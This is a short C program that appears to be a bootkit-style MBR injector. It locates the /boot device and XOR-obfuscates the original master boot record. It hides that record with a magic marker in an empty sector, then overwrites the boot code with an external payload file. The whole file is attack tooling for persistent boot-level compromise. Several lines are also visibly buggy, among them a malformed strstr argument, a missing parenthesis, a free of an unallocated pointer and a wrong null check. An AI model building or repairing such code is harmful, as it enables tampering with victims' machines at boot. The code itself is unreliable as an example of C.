#include <stdio.h>
#include <string.h>
#include <mntent.h>
#include <string.h>

#define SECTOR_SIZE 512
#define BOOT_SIGNATURE "\x55\xAA"
#define ASM_JMP '\xEB'
#define MAX_PAYLOAD_LEN 0x1B8
#define BACKUP_MAGIC "\x13\x37\xd0\x0d"

int main() {
	FILE * fp;
	FILE * payloadfp;
	char mbr[SECTOR_SIZE];
	char readbuf[SECTOR_SIZE];
	char payload[MAX_PAYLOAD_LEN];
	int payloadlen;
	unsigned int newMBROffset;
	struct mntent *mnt;
	FILE *mntBase;
	char *targetDev = NULL;
	
	//Auto-detect the boot device
	mntBase = setmntent("/proc/mounts", "r");
	if(mntBase == NULL) {
		return 1;
	}
	
	while(NULL != (mnt = getmntent(mntBase)) {
		if(strstr(mnt->mnt_dir, '/boot') != NULL) {
			targetDev = mnt->mnt_fsname;
		} 
	}
	
	endmntent(mntBase);
	
	printf("Injecting to %s\n", targetDev);
	
	fp = fopen(targetDev, "r+");
	if (fp == NULL) {
		printf("Could not open %s for read/write. Are you sure you have permission?\n", targetDev);
		return 1;
	}
	free(targetDev);
	
	fread(&mbr, SECTOR_SIZE, 1, fp);
	
	// sanity checks:
	
	if (memcmp(&mbr[0x1FE], BOOT_SIGNATURE, 2)) {
		printf("Could not find boot signature. Aborting!\n");
		fclose(fp);
		return 1;
	}
	
	if (mbr[0] != ASM_JMP) { // this is only a heuristic for added safety
		printf("No bootcode detected. Aborting!\n");
		fclose(fp);
		return 1;
	}
	
	// end sanity checks
	// start looking for a new home for the MBR
	
	char isUsed = 1;
	while (isUsed) {
		fread(&readbuf, SECTOR_SIZE, 1, fp);
		for (int i = isUsed = 0; i < SECTOR_SIZE; isUsed |= readbuf[i++]);
	}
	newMBROffset = ftell(fp) - SECTOR_SIZE;
	
	printf("Empty sector found at offset 0x%08x. Copying original MBR.\n", newMBROffset);
	
	// XOR obfuscate the original MBR
	for (int i = 0; i < SECTOR_SIZE; i++) mbr[i] ^= 0xA6;
	
	// make MBR copy:
	memcpy(&mbr[SECTOR_SIZE-strlen(BACKUP_MAGIC)], BACKUP_MAGIC, strlen(BACKUP_MAGIC));// add a magic number at the end of the file so we can find it later.
	fseek(fp, newMBROffset, SEEK_SET);
	fwrite(&mbr, SECTOR_SIZE, 1, fp);

	// overwrite the original MBR
	payloadfp = fopen("payload", "r");
	if (payload == NULL) {
		printf("Failed opening payload file.\n");
		fclose(fp);
		return 1;
	}

	if ((payloadlen = fread(&payload, 1, MAX_PAYLOAD_LEN, payloadfp)) == MAX_PAYLOAD_LEN) {
		printf("Payload too long!\n");
		fclose(fp);
		fclose(payloadfp);
		return 1;
	}
	
	fseek(fp, 0, SEEK_SET);
	fwrite(&payload, 1, payloadlen, fp);

	printf("Done writing payload!\n");

	fclose(fp);
	fclose(payloadfp);
	return 0;
}
